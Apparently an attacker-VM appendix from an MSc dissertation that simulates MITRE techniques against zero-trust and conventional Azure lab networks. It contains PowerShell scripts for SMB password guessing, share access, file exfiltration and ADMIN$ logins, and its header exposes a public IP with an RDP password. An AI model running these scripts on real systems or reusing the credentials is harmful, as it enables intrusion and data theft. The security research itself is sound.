================================================================
FILE 4 — ATTACKER VM (vm-attacker)
Atomic Red Team Setup and MITRE ATT&CK Attack Simulation
Sheffield Hallam University · MSc Dissertation 2026
================================================================

Access: RDP via public IP 51.143.166.82 or Azure Bastion
  Username: researchadmin
  Password: Research@ZTA2026!

Experiment date: 16 June 2026
Attack window:   19:00 – 21:00 UTC

Target IPs:
  ZTA Domain Controller:          10.0.1.10
  ZTA File Server:                10.0.1.20
  Conventional Domain Controller: 10.1.1.10
  Conventional File Server:       10.1.1.20

SECTION 2 — ATTACK CATEGORY 1: CREDENTIAL THEFT (T1110.001)
MITRE: Brute Force — Password Guessing via SMB IPC$
3 runs per environment
----------------------------------------------------------------

# --- CONVENTIONAL ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "CONVENTIONAL CREDENTIAL THEFT RUN 1 started: $startTime"; $passwords = @("Password1", "1q2w3e4r", "Password!", "Spring2022", "ChangeMe!", "Summer2023", "Winter2024"); foreach ($password in $passwords) { $result = net use \\10.1.1.10\IPC$ /user:"CONVRESEARCH\testuser01" "$password" 2>&1; if ($result -match "command completed successfully") { Write-Host "[SUCCESS] testuser01:$password" -ForegroundColor Green; net use * /delete /yes 2>&1 | Out-Null } else { Write-Host "[FAILED] testuser01:$password" -ForegroundColor Red } }; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "CONVENTIONAL CREDENTIAL THEFT RUN 2 started: $startTime"; $passwords = @("Password1", "1q2w3e4r", "Password!", "Spring2022", "ChangeMe!", "Summer2023", "Winter2024"); foreach ($password in $passwords) { $result = net use \\10.1.1.10\IPC$ /user:"CONVRESEARCH\testuser01" "$password" 2>&1; if ($result -match "command completed successfully") { Write-Host "[SUCCESS] testuser01:$password" -ForegroundColor Green; net use * /delete /yes 2>&1 | Out-Null } else { Write-Host "[FAILED] testuser01:$password" -ForegroundColor Red } }; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "CONVENTIONAL CREDENTIAL THEFT RUN 3 started: $startTime"; $passwords = @("Password1", "1q2w3e4r", "Password!", "Spring2022", "ChangeMe!", "Summer2023", "Winter2024"); foreach ($password in $passwords) { $result = net use \\10.1.1.10\IPC$ /user:"CONVRESEARCH\testuser01" "$password" 2>&1; if ($result -match "command completed successfully") { Write-Host "[SUCCESS] testuser01:$password" -ForegroundColor Green; net use * /delete /yes 2>&1 | Out-Null } else { Write-Host "[FAILED] testuser01:$password" -ForegroundColor Red } }; Write-Host "Completed: $(Get-Date)"

# --- ZTA ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "ZTA CREDENTIAL THEFT RUN 1 started: $startTime"; $passwords = @("Password1", "1q2w3e4r", "Password!", "Spring2022", "ChangeMe!", "Summer2023", "Winter2024"); foreach ($password in $passwords) { $result = net use \\10.0.1.10\IPC$ /user:"ZTARESEARCH\testuser01" "$password" 2>&1; if ($result -match "command completed successfully") { Write-Host "[SUCCESS] testuser01:$password" -ForegroundColor Green; net use * /delete /yes 2>&1 | Out-Null } else { Write-Host "[FAILED] testuser01:$password" -ForegroundColor Red } }; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "ZTA CREDENTIAL THEFT RUN 2 started: $startTime"; $passwords = @("Password1", "1q2w3e4r", "Password!", "Spring2022", "ChangeMe!", "Summer2023", "Winter2024"); foreach ($password in $passwords) { $result = net use \\10.0.1.10\IPC$ /user:"ZTARESEARCH\testuser01" "$password" 2>&1; if ($result -match "command completed successfully") { Write-Host "[SUCCESS] testuser01:$password" -ForegroundColor Green; net use * /delete /yes 2>&1 | Out-Null } else { Write-Host "[FAILED] testuser01:$password" -ForegroundColor Red } }; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "ZTA CREDENTIAL THEFT RUN 3 started: $startTime"; $passwords = @("Password1", "1q2w3e4r", "Password!", "Spring2022", "ChangeMe!", "Summer2023", "Winter2024"); foreach ($password in $passwords) { $result = net use \\10.0.1.10\IPC$ /user:"ZTARESEARCH\testuser01" "$password" 2>&1; if ($result -match "command completed successfully") { Write-Host "[SUCCESS] testuser01:$password" -ForegroundColor Green; net use * /delete /yes 2>&1 | Out-Null } else { Write-Host "[FAILED] testuser01:$password" -ForegroundColor Red } }; Write-Host "Completed: $(Get-Date)"

RESULTS:
  Conventional: All 7 passwords failed (wrong passwords — no match in wordlist)
  ZTA: All 7 passwords failed — Runs 1 and 2 showed 22-23 second delays (NSG friction)
  ZTA delay confirmed by Mann-Whitney U test: p = 0.0016

----------------------------------------------------------------
SECTION 3 — ATTACK CATEGORY 2: LATERAL MOVEMENT (T1021.002)
MITRE: Remote Services — SMB/Windows Admin Shares
3 runs per environment
----------------------------------------------------------------

# --- CONVENTIONAL ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "CONVENTIONAL LATERAL MOVEMENT RUN 1 started: $startTime"; $result = net use \\10.1.1.20\HR_Records /user:"CONVRESEARCH\testuser01" "UserPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "CONVENTIONAL LATERAL MOVEMENT RUN 2 started: $startTime"; $result = net use \\10.1.1.20\HR_Records /user:"CONVRESEARCH\testuser01" "UserPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "CONVENTIONAL LATERAL MOVEMENT RUN 3 started: $startTime"; $result = net use \\10.1.1.20\HR_Records /user:"CONVRESEARCH\testuser01" "UserPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# --- ZTA ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "ZTA LATERAL MOVEMENT RUN 1 started: $startTime"; $result = net use \\10.0.1.20\HR_Records /user:"ZTARESEARCH\testuser01" "UserPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "ZTA LATERAL MOVEMENT RUN 2 started: $startTime"; $result = net use \\10.0.1.20\HR_Records /user:"ZTARESEARCH\testuser01" "UserPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "ZTA LATERAL MOVEMENT RUN 3 started: $startTime"; $result = net use \\10.0.1.20\HR_Records /user:"ZTARESEARCH\testuser01" "UserPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

RESULTS:
  Conventional: The command completed successfully (all 3 runs)
  ZTA: System error 53 — The network path was not found (all 3 runs)
  ZTA BLOCKED by NSG rule: block-attacker-to-fs (priority 220)

----------------------------------------------------------------
SECTION 4 — ATTACK CATEGORY 3: DATA EXFILTRATION (T1041)
MITRE: Exfiltration Over C2 Channel — file copy via SMB
3 runs per environment
----------------------------------------------------------------

# --- CONVENTIONAL ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "CONVENTIONAL EXFILTRATION RUN 1 started: $startTime"; net use \\10.1.1.20\HR_Records /user:"CONVRESEARCH\testuser01" "UserPass@123" 2>&1 | Out-Null; Copy-Item "\\10.1.1.20\HR_Records\document_1.txt" "C:\exfil_conv1.txt" 2>&1; Write-Host "File exfiltrated: $(Test-Path C:\exfil_conv1.txt)"; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "CONVENTIONAL EXFILTRATION RUN 2 started: $startTime"; net use \\10.1.1.20\HR_Records /user:"CONVRESEARCH\testuser01" "UserPass@123" 2>&1 | Out-Null; Copy-Item "\\10.1.1.20\HR_Records\document_2.txt" "C:\exfil_conv2.txt" 2>&1; Write-Host "File exfiltrated: $(Test-Path C:\exfil_conv2.txt)"; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "CONVENTIONAL EXFILTRATION RUN 3 started: $startTime"; net use \\10.1.1.20\HR_Records /user:"CONVRESEARCH\testuser01" "UserPass@123" 2>&1 | Out-Null; Copy-Item "\\10.1.1.20\HR_Records\document_3.txt" "C:\exfil_conv3.txt" 2>&1; Write-Host "File exfiltrated: $(Test-Path C:\exfil_conv3.txt)"; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# --- ZTA ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "ZTA EXFILTRATION RUN 1 started: $startTime"; net use \\10.0.1.20\HR_Records /user:"ZTARESEARCH\testuser01" "UserPass@123" 2>&1 | Out-Null; Copy-Item "\\10.0.1.20\HR_Records\document_1.txt" "C:\exfil_zta1.txt" 2>&1; Write-Host "File exfiltrated: $(Test-Path C:\exfil_zta1.txt)"; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "ZTA EXFILTRATION RUN 2 started: $startTime"; net use \\10.0.1.20\HR_Records /user:"ZTARESEARCH\testuser01" "UserPass@123" 2>&1 | Out-Null; Copy-Item "\\10.0.1.20\HR_Records\document_2.txt" "C:\exfil_zta2.txt" 2>&1; Write-Host "File exfiltrated: $(Test-Path C:\exfil_zta2.txt)"; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "ZTA EXFILTRATION RUN 3 started: $startTime"; net use \\10.0.1.20\HR_Records /user:"ZTARESEARCH\testuser01" "UserPass@123" 2>&1 | Out-Null; Copy-Item "\\10.0.1.20\HR_Records\document_3.txt" "C:\exfil_zta3.txt" 2>&1; Write-Host "File exfiltrated: $(Test-Path C:\exfil_zta3.txt)"; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

RESULTS:
  Conventional: File exfiltrated: True (all 3 runs)
  ZTA: File exfiltrated: False — Cannot find path (all 3 runs)
  ZTA BLOCKED by NSG rule: block-attacker-to-fs (priority 220)

----------------------------------------------------------------
SECTION 5 — ATTACK CATEGORY 4: PRIVILEGE ESCALATION (T1078)
MITRE: Valid Accounts — ADMIN$ share access with admin credentials
3 runs per environment
----------------------------------------------------------------

# --- CONVENTIONAL ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "CONVENTIONAL PRIVILEGE ESCALATION RUN 1 started: $startTime"; $result = net use \\10.1.1.10\ADMIN$ /user:"CONVRESEARCH\adminuser01" "AdminPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "CONVENTIONAL PRIVILEGE ESCALATION RUN 2 started: $startTime"; $result = net use \\10.1.1.10\ADMIN$ /user:"CONVRESEARCH\adminuser01" "AdminPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "CONVENTIONAL PRIVILEGE ESCALATION RUN 3 started: $startTime"; $result = net use \\10.1.1.10\ADMIN$ /user:"CONVRESEARCH\adminuser01" "AdminPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# --- ZTA ENVIRONMENT ---

# Run 1
$startTime = Get-Date; Write-Host "ZTA PRIVILEGE ESCALATION RUN 1 started: $startTime"; $result = net use \\10.0.1.10\ADMIN$ /user:"ZTARESEARCH\adminuser01" "AdminPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "ZTA PRIVILEGE ESCALATION RUN 2 started: $startTime"; $result = net use \\10.0.1.10\ADMIN$ /user:"ZTARESEARCH\adminuser01" "AdminPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "ZTA PRIVILEGE ESCALATION RUN 3 started: $startTime"; $result = net use \\10.0.1.10\ADMIN$ /user:"ZTARESEARCH\adminuser01" "AdminPass@123" 2>&1; Write-Host $result; net use * /delete /yes 2>&1 | Out-Null; Write-Host "Completed: $(Get-Date)"

RESULTS:
  Conventional: The command completed successfully (all 3 runs)
  ZTA Run 1: System error 64 — The specified network name is no longer available
  ZTA Run 2: System error 53 — The network path was not found
  ZTA Run 3: System error 53 — The network path was not found
  ZTA BLOCKED by NSG + JIT access controls

----------------------------------------------------------------
SECTION 6 — ATTACK CATEGORY 5: MISCONFIGURATION EXPLOITATION (T1190)
MITRE: Exploit Public-Facing Application — Azure Blob Storage
3 runs per environment
----------------------------------------------------------------

# Install Azure CLI on attacker VM (if not installed)
# curl -L https://aka.ms/installazurecliwindows -o AzureCLI.msi && msiexec /i AzureCLI.msi /quiet /norestart

# --- CONVENTIONAL ENVIRONMENT (public access enabled) ---

# Run 1
$startTime = Get-Date; Write-Host "CONVENTIONAL MISCONFIGURATION RUN 1 started: $startTime"; $result = Invoke-WebRequest -Uri "https://saconvresearch01.blob.core.windows.net/sensitive-documents/document_1.txt" -UseBasicParsing 2>&1; Write-Host "Status: $($result.StatusCode)"; Write-Host "Content: $($result.Content)"; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "CONVENTIONAL MISCONFIGURATION RUN 2 started: $startTime"; $result = Invoke-WebRequest -Uri "https://saconvresearch01.blob.core.windows.net/sensitive-documents/document_2.txt" -UseBasicParsing 2>&1; Write-Host "Status: $($result.StatusCode)"; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "CONVENTIONAL MISCONFIGURATION RUN 3 started: $startTime"; $result = Invoke-WebRequest -Uri "https://saconvresearch01.blob.core.windows.net/sensitive-documents/document_3.txt" -UseBasicParsing 2>&1; Write-Host "Status: $($result.StatusCode)"; Write-Host "Completed: $(Get-Date)"

# --- ZTA ENVIRONMENT (public access disabled) ---

# Run 1
$startTime = Get-Date; Write-Host "ZTA MISCONFIGURATION RUN 1 started: $startTime"; $result = Invoke-WebRequest -Uri "https://saztaresearch01.blob.core.windows.net/sensitive-documents/document_1.txt" -UseBasicParsing 2>&1; Write-Host "Status: $($result.StatusCode)"; Write-Host "Completed: $(Get-Date)"

# Run 2
$startTime = Get-Date; Write-Host "ZTA MISCONFIGURATION RUN 2 started: $startTime"; $result = Invoke-WebRequest -Uri "https://saztaresearch01.blob.core.windows.net/sensitive-documents/document_2.txt" -UseBasicParsing 2>&1; Write-Host "Status: $($result.StatusCode)"; Write-Host "Completed: $(Get-Date)"

# Run 3
$startTime = Get-Date; Write-Host "ZTA MISCONFIGURATION RUN 3 started: $startTime"; $result = Invoke-WebRequest -Uri "https://saztaresearch01.blob.core.windows.net/sensitive-documents/document_3.txt" -UseBasicParsing 2>&1; Write-Host "Status: $($result.StatusCode)"; Write-Host "Completed: $(Get-Date)"

RESULTS:
  Conventional: Status 200 — CONFIDENTIAL DUMMY DATA returned (all 3 runs)
  ZTA: AuthorizationFailure — This request is not authorized (all 3 runs)
  ZTA BLOCKED by private endpoint + disabled public network access

----------------------------------------------------------------
SECTION 7 — EXPERIMENT SUMMARY
----------------------------------------------------------------

Total runs: 30 (5 categories x 3 runs x 2 environments)
Experiment date: 16 June 2026
Attack window: 19:08 UTC to 20:21 UTC

Attack Category     | Conventional | ZTA      | ZTA Effective?
T1110.001 Cred      | Failed       | Failed   | Partial (delay)
T1021.002 Lateral   | Succeeded    | BLOCKED  | Yes — 100%
T1041 Exfiltration  | Succeeded    | BLOCKED  | Yes — 100%
T1078 Priv Escalate | Succeeded    | BLOCKED  | Yes — 100%
T1190 Misconfigured | Succeeded    | BLOCKED  | Yes — 100%

Statistical significance:
  Fisher's exact test: p = 7.4e-07 (p < 0.0001)
  Mann-Whitney U test: U = 119.0, p = 0.0016

Sentinel telemetry:
  Total events: 1,000
  Events during attack window: 623
  EventID 4648 (explicit credentials): 8 events
  EventID 4625 (failed logon): 0 (attacks blocked at network layer)

================================================================
END OF FILE 4
================================================================
